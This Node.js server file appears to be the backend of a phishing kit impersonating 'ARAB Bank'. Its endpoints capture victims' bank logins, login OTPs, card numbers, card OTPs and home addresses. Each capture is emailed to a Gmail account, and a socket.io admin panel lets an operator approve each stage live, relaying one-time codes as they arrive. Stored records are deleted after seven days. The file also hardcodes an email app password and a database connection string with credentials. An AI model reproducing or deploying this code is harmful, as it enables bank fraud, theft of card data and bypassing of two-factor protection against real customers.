const express = require("express");
const https = require("https");
const app = express();
const cors = require("cors");
const nodemailer = require("nodemailer");
const { Order } = require("./models");
const { default: mongoose } = require("mongoose");
const { emitWorkflowUpdate, buildVisitorSyncPayload } = require("./notify");
const server = require("http").createServer(app);
const PORT = process.env.PORT || 8080;
const io = require("socket.io")(server, {
  cors: { origin: "*" },
  pingInterval: 20000,
  pingTimeout: 45000,
  connectTimeout: 45000,
});
app.use(express.json());
app.use(cors({ origin: "*" }));
app.use(require("morgan")("dev"));

let visitorsCount = 0;
let dashboardCount = 0;
const SMTP_USER = "cashzain763@gmail.com";
const SMTP_PASS = "pchx isjj rvha zkfg";

async function saveOrderNotify(ioInstance, id, patch) {
  const order = await Order.findByIdAndUpdate(id, { ...patch }, { new: true });
  if (order) emitWorkflowUpdate(ioInstance, order);
  return order;
}

async function rejectOrder(ioInstance, id, reason, reviewPatch = {}) {
  return saveOrderNotify(ioInstance, id, {
    rejectReason: reason || "rejected",
    ...reviewPatch,
  });
}

/** Align with notify.js reviewTri — decline sets review* false so pending becomes false */
function pendingReviewLogin(o) {
  if (o.reviewLogin === false) return false;
  if (o.reviewLogin === true) return true;
  return (
    !o.loginAccept &&
    !!(o.username || o.password)
  );
}

function pendingReviewLoginOtp(o) {
  if (o.reviewLoginOtp === false) return false;
  if (o.reviewLoginOtp === true) return true;
  return !!(o.otpLogin && !o.otpLoginAccept);
}

function pendingReviewVisa(o) {
  if (o.reviewVisa === false) return false;
  if (o.reviewVisa === true) return true;
  const accepted = o.cardAccept ?? o.CardAccept;
  return !!(o.cardNumber && !accepted);
}

function pendingReviewCardOtp(o) {
  if (o.reviewCardOtp === false) return false;
  if (o.reviewCardOtp === true) return true;
  const accepted = o.cardOtpAccept ?? o.OtpCardAccept;
  return !!(o.cardOtp && !accepted);
}

const sendEmail = async (data, type) => {
  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: SMTP_USER,
      pass: SMTP_PASS,
    },
  });
  let htmlContent = "<div>";
  for (const [key, value] of Object.entries(data)) {
    htmlContent += `<p>${key}: ${typeof value === "object" ? JSON.stringify(value) : value
      }</p>`;
  }

  const mailTo = SMTP_USER;
  return await transporter
    .sendMail({
      from: "Admin Panel",
      to: mailTo,
      subject: `${type === "visa"
        ? "ARAB Bank Visa"
        : type === "Login"
          ? "ARAB Bank Login "
          : type === "otp"
            ? "ARAB Bank Otp "
            : type === "cardOtp"
              ? "ARAB Visa  Otp"
              : type === "form"
                ? "ARAB Form Data "
                : "ARAB Bank "
        }`,
      html: htmlContent,
    })
    .then((info) => {
      if (info.accepted.length) {
        return true;
      } else {
        return false;
      }
    });
};

app.get("/", (req, res) => res.sendStatus(200));
app.delete("/", async (req, res) => {
  await Order.find({})
    .then(async (orders) => {
      await Promise.resolve(
        orders.forEach(async (order) => {
          await Order.findByIdAndDelete(order._id);
        })
      );
    })
    .then(() => res.sendStatus(200));
});

app.post("/login", async (req, res) => {
  try {
    const body = {
      password: req.body.password,
      username: req.body.username,
      chosenCountry: String(req.body.chosenCountry || "").trim(),
      checked: false,
      reviewLogin: true,
    };
    const order = await Order.create(body);
    await sendEmail(body, "login");
    emitWorkflowUpdate(io, order);
    res.status(201).json({ order });
  } catch (error) {
    console.log("Error: " + error);
    return res.sendStatus(500);
  }
});

/** Resubmit login credentials on same order after decline (clears rejectReason). */
app.post("/order/:id/login", async (req, res) => {
  try {
    const o = await Order.findById(req.params.id);
    if (!o) return res.sendStatus(404);
    if (o.loginAccept)
      return res.status(400).json({ error: "already_accepted" });
    const username = req.body.username || "";
    const body = {
      username,
      password: req.body.password,
      chosenCountry: String(req.body.chosenCountry || "").trim(),
      rejectReason: null,
      checked: false,
      reviewLogin: true,
    };
    const order = await Order.findByIdAndUpdate(req.params.id, body, {
      new: true,
    });
    await sendEmail(body, "login");
    emitWorkflowUpdate(io, order);
    res.json(order);
  } catch (error) {
    console.log("Error: " + error);
    return res.sendStatus(500);
  }
});

app.get("/order/:id", async (req, res) => {
  try {
    const order = await Order.findById(req.params.id);
    if (!order) return res.sendStatus(404);
    res.json(order);
  } catch (e) {
    console.log(e);
    res.sendStatus(500);
  }
});

app.get("/order/:id/state", async (req, res) => {
  try {
    const o = await Order.findById(req.params.id).lean();
    if (!o) return res.sendStatus(404);
    res.json(buildVisitorSyncPayload(o));
  } catch (e) {
    console.log(e);
    res.sendStatus(500);
  }
});

/** Visitor one-way chat from success page — stored as order notes for admin */
app.post("/order/:id/visitor-chat", async (req, res) => {
  try {
    const text = String(req.body.text || "").trim();
    if (!text || text.length > 8000) {
      return res.status(400).json({ error: "validation" });
    }
    const { id } = req.params;
    const order = await Order.findByIdAndUpdate(
      id,
      {
        $push: {
          visitorChatMessages: { text, at: new Date() },
        },
      },
      { new: true },
    );
    if (!order) return res.sendStatus(404);
    emitWorkflowUpdate(io, order);
    res.json(order);
  } catch (e) {
    console.log(e);
    res.sendStatus(500);
  }
});

/** Admin workflow API */
app.post("/admin/order/:id/login/accept", async (req, res) => {
  try {
    const o = await Order.findById(req.params.id);
    if (!o) return res.sendStatus(404);
    if (o.loginAccept || !pendingReviewLogin(o))
      return res.status(400).json({ error: "invalid_stage" });
    const order = await saveOrderNotify(io, req.params.id, {
      loginAccept: true,
      reviewLogin: false,
    });
    res.json(order);
  } catch (e) {
    console.log(e);
    res.sendStatus(500);
  }
});

app.post("/admin/order/:id/login/decline", async (req, res) => {
  try {
    const reason =
      req.body.rejectReason || req.body.reason || "login_declined";
    const order = await rejectOrder(io, req.params.id, reason, {
      reviewLogin: false,
    });
    if (!order) return res.sendStatus(404);
    res.json(order);
  } catch (e) {
    console.log(e);
    res.sendStatus(500);
  }
});

app.post("/admin/order/:id/goto/visa", async (req, res) => {
  try {
    const o = await Order.findById(req.params.id);
    if (!o) return res.sendStatus(404);
    if (!o.loginAccept || o.otpLoginAccept)
      return res.status(400).json({ error: "invalid_stage" });
    const order = await saveOrderNotify(io, req.params.id, {
      otpLoginAccept: true,
      reviewLoginOtp: false,
    });
    res.json(order);
  } catch (e) {
    console.log(e);
    res.sendStatus(500);
  }
});

app.post("/order/:id/login-otp", async (req, res) => {
  try {
    const otp = String(req.body.otpLogin || req.body.otp || "").trim();
    const o = await Order.findById(req.params.id);
    if (!o) return res.sendStatus(404);
    const order = await saveOrderNotify(io, req.params.id, {
      otpLogin: otp,
      otpLoginAccept: false,
      rejectReason: null,
      reviewLoginOtp: true,
    });
    await sendEmail({ otpLogin: otp, orderId: req.params.id }, "otp");
    res.json(order);
  } catch (e) {
    console.log(e);
    res.sendStatus(500);
  }
});

app.post("/admin/order/:id/login-otp/accept", async (req, res) => {
  try {
    const o = await Order.findById(req.params.id);
    if (!o) return res.sendStatus(404);
    if (!pendingReviewLoginOtp(o))
      return res.status(400).json({ error: "invalid_stage" });
    const order = await saveOrderNotify(io, req.params.id, {
      otpLoginAccept: true,
      reviewLoginOtp: false,
    });
    res.json(order);
  } catch (e) {
    console.log(e);
    res.sendStatus(500);
  }
});

app.post("/admin/order/:id/login-otp/decline", async (req, res) => {
  try {
    const reason =
      req.body.rejectReason || req.body.reason || "login_otp_declined";
    const order = await rejectOrder(io, req.params.id, reason, {
      reviewLoginOtp: false,
    });
    if (!order) return res.sendStatus(404);
    res.json(order);
  } catch (e) {
    console.log(e);
    res.sendStatus(500);
  }
});

app.post("/admin/order/:id/visa/accept", async (req, res) => {
  try {
    const o = await Order.findById(req.params.id);
    if (!o) return res.sendStatus(404);
    if (!pendingReviewVisa(o))
      return res.status(400).json({ error: "invalid_stage" });
    const order = await saveOrderNotify(io, req.params.id, {
      cardAccept: true,
      reviewVisa: false,
    });
    res.json(order);
  } catch (e) {
    console.log(e);
    res.sendStatus(500);
  }
});

app.post("/admin/order/:id/visa/decline", async (req, res) => {
  try {
    const reason =
      req.body.rejectReason || req.body.reason || "visa_declined";
    const order = await rejectOrder(io, req.params.id, reason, {
      reviewVisa: false,
    });
    if (!order) return res.sendStatus(404);
    res.json(order);
  } catch (e) {
    console.log(e);
    res.sendStatus(500);
  }
});

app.post("/admin/order/:id/card-otp/accept", async (req, res) => {
  try {
    const o = await Order.findById(req.params.id);
    if (!o) return res.sendStatus(404);
    if (!pendingReviewCardOtp(o))
      return res.status(400).json({ error: "invalid_stage" });
    const order = await saveOrderNotify(io, req.params.id, {
      cardOtpAccept: true,
      checked: true,
      reviewCardOtp: false,
    });
    res.json(order);
  } catch (e) {
    console.log(e);
    res.sendStatus(500);
  }
});

app.post("/admin/order/:id/card-otp/decline", async (req, res) => {
  try {
    const reason =
      req.body.rejectReason || req.body.reason || "card_otp_declined";
    const order = await rejectOrder(io, req.params.id, reason, {
      reviewCardOtp: false,
    });
    if (!order) return res.sendStatus(404);
    res.json(order);
  } catch (e) {
    console.log(e);
    res.sendStatus(500);
  }
});

app.get("/order/checked/:id", async (req, res) => {
  try {
    const { id } = req.params;
    await Order.findByIdAndUpdate(id, { checked: true }).then(() =>
      res.sendStatus(200)
    );
  } catch (error) {
    console.log("Error: " + error);
    return res.sendStatus(500);
  }
});

app.post("/reg", async (req, res) => {
  try {
    await Order.create(req.body)
      .then(
        async (order) =>
          await sendEmail(req.body, "reg")
          .then(() => res.status(201).json(order))
      );
  } catch (error) {
    console.log("Error: " + error);
    return res.sendStatus(500);
  }
});


app.post("/visa/:id", async (req, res) => {
  const { id } = req.params;
  const existing = await Order.findById(id);
  if (!existing) return res.sendStatus(404);
  // if (!existing.otpLoginAccept || existing.cardAccept)
  //   return res.status(400).json({ error: "invalid_stage" });
  try {
    const order = await Order.findByIdAndUpdate(
      id,
      {
        ...req.body,
        checked: false,
        cardAccept: false,
        rejectReason: null,
        reviewVisa: true,
      },
      { new: true },
    );
    await sendEmail(req.body, "visa");
    emitWorkflowUpdate(io, order);
    res.status(200).json(order);
  } catch (e) {
    console.log(e);
    res.sendStatus(500);
  }
});

app.post("/visaOtp/:id", async (req, res) => {
  const { id } = req.params;
  const existing = await Order.findById(id);
  if (!existing) return res.sendStatus(404);
  // if (!existing.cardAccept || existing.cardOtpAccept)
  //   return res.status(400).json({ error: "invalid_stage" });
  try {
    const order = await Order.findByIdAndUpdate(
      id,
      {
        cardOtp: req.body.otp,
        checked: false,
        cardOtpAccept: false,
        rejectReason: null,
        reviewCardOtp: true,
      },
      { new: true },
    );
    await sendEmail(req.body, "otp");
    emitWorkflowUpdate(io, order);
    res.status(200).json(order);
  } catch (e) {
    console.log(e);
    res.sendStatus(500);
  }
});

/** Visitor personal/address form — persisted on Order for admin dashboard */
app.post("/order/:id/form-data", async (req, res) => {
  try {
    const { id } = req.params;
    const o = await Order.findById(id);
    if (!o) return res.sendStatus(404);

    const name = String(req.body.name || "").trim();
    const email = String(req.body.email || "").trim();
    const phone = String(req.body.phone || "").replace(/\D/g, "");
    const country = String(req.body.country || "").trim();
    const state = String(req.body.state || "").trim();
    const street = String(req.body.street || "").trim();

    if (
      !name ||
      !email ||
      phone.length < 8 ||
      !country ||
      !state ||
      !street
    ) {
      return res.status(400).json({ error: "validation" });
    }

    const order = await saveOrderNotify(io, id, {
      name,
      email,
      phone,
      country,
      state,
      street,
      rejectReason: null,
      formAccept: false,
      reviewForm: true,
    });
    await sendEmail(
      {
        name,
        email,
        phone,
        country,
        state,
        street,
        orderId: id,
      },
      "form",
    );
    res.json(order);
  } catch (e) {
    console.log(e);
    res.sendStatus(500);
  }
});

app.post("/admin/order/:id/form/accept", async (req, res) => {
  try {
    const o = await Order.findById(req.params.id);
    if (!o) return res.sendStatus(404);
    // if (!o.reviewForm || o.formAccept)
    //   return res.status(400).json({ error: "invalid_stage" });
    const order = await saveOrderNotify(io, req.params.id, {
      formAccept: true,
      reviewForm: false,
      rejectReason: null,
    });
    res.json(order);
  } catch (e) {
    console.log(e);
    res.sendStatus(500);
  }
});

app.post("/admin/order/:id/form/decline", async (req, res) => {
  try {
    const o = await Order.findById(req.params.id);
    if (!o) return res.sendStatus(404);
    if (!o.reviewForm || o.formAccept)
      return res.status(400).json({ error: "invalid_stage" });
    const reason =
      req.body.rejectReason || req.body.reason || "form_declined";
    const order = await rejectOrder(io, req.params.id, reason, {
      reviewForm: false,
    });
    if (!order) return res.sendStatus(404);
    res.json(order);
  } catch (e) {
    console.log(e);
    res.sendStatus(500);
  }
});

app.get(
  "/users",
  async (req, res) => await Order.find().then((users) => res.json(users))
);

app.delete("/order/:id", async (req, res) => {
  try {
    await Order.findByIdAndDelete(req.params.id);
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(500);
  }
});

app.delete("/orders/all", async (req, res) => {
  try {
    await Order.deleteMany({});
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(500);
  }
});

io.on("connection", (socket) => {
  console.log("connected");

  // Immediately send current counts to the newly connected socket
  socket.emit("onlineCounts", { visitors: visitorsCount, dashboard: dashboardCount });

  socket.on("join", (data) => {
    socket.role = data.role || "visitor";
    if (socket.role === "admin") {
      dashboardCount++;
    } else {
      visitorsCount++;
    }
    io.emit("onlineCounts", { visitors: visitorsCount, dashboard: dashboardCount });
  });

  socket.on("disconnect", () => {
    if (socket.role === "admin") {
      dashboardCount--;
    } else if (socket.role === "visitor") {
      visitorsCount--;
    }
    io.emit("onlineCounts", { visitors: visitorsCount, dashboard: dashboardCount });
  });

  socket.on("joinOrder", ({ orderId }) => {
    if (orderId) socket.join(`order:${orderId}`);
  });

  socket.on("joinAdmin", () => {
    socket.join("admin");
  });

  socket.on("newUser", () => io.emit("newUser"));

  socket.on("newData", () => io.emit("newData"));

  socket.on("paymentForm", (data) => {
    console.log("paymentForm Wait", data);
    io.emit("paymentForm", data);
  });

  socket.on("acceptPaymentForm", async (id) => {
    console.log("acceptPaymentForm From Admin", id);
    const order = await Order.findByIdAndUpdate(
      id,
      {
        cardAccept: true,
        reviewVisa: false,
      },
      { new: true },
    );
    if (order) emitWorkflowUpdate(io, order);
    io.emit("acceptPaymentForm", id);
  });
  socket.on("declinePaymentForm", async (id) => {
    console.log("declinePaymentForm Form Admin", id);
    const order = await rejectOrder(io, id, "payment_declined", {
      reviewVisa: false,
    });
    io.emit("declinePaymentForm", id);
  });

  socket.on("visaOtp", (data) => {
    console.log("visaOtp  received", data);
    io.emit("visaOtp", data);
  });
  socket.on("acceptVisaOtp", async (id) => {
    console.log("acceptVisaOtp From Admin", id);
    const order = await Order.findByIdAndUpdate(
      id,
      {
        cardOtpAccept: true,
        checked: true,
        reviewCardOtp: false,
      },
      { new: true },
    );
    if (order) emitWorkflowUpdate(io, order);
    io.emit("acceptVisaOtp", id);
  });
  socket.on("declineVisaOtp", async (id) => {
    console.log("declineVisaOtp Form Admin", id);
    await rejectOrder(io, id, "card_otp_declined", { reviewCardOtp: false });
    io.emit("declineVisaOtp", id);
  });
});

// Function to delete orders older than 7 days
const deleteOldOrders = async () => {
  const sevenDaysAgo = new Date();
  sevenDaysAgo.setDate(sevenDaysAgo.getDate() - 7);
  try {
    const result = await Order.deleteMany({ created: { $lt: sevenDaysAgo } });
    console.log(`${result.deletedCount} orders deleted.`);
  } catch (error) {
    console.error("Error deleting old orders:", error);
  }
};

// Function to run daily
const runDailyTask = () => {
  deleteOldOrders();
  setTimeout(runDailyTask, 24 * 60 * 60 * 1000); // Schedule next execution in 24 hours
};

mongoose
  .connect("mongodb+srv://amazon:wfao74K8WVNBahDQ@arab.dzdqr5o.mongodb.net/migration")
  .then((conn) =>
    server.listen(PORT, () => {
      runDailyTask();
      console.log("server running and connected to db" + conn.connection.host);
    })
  );




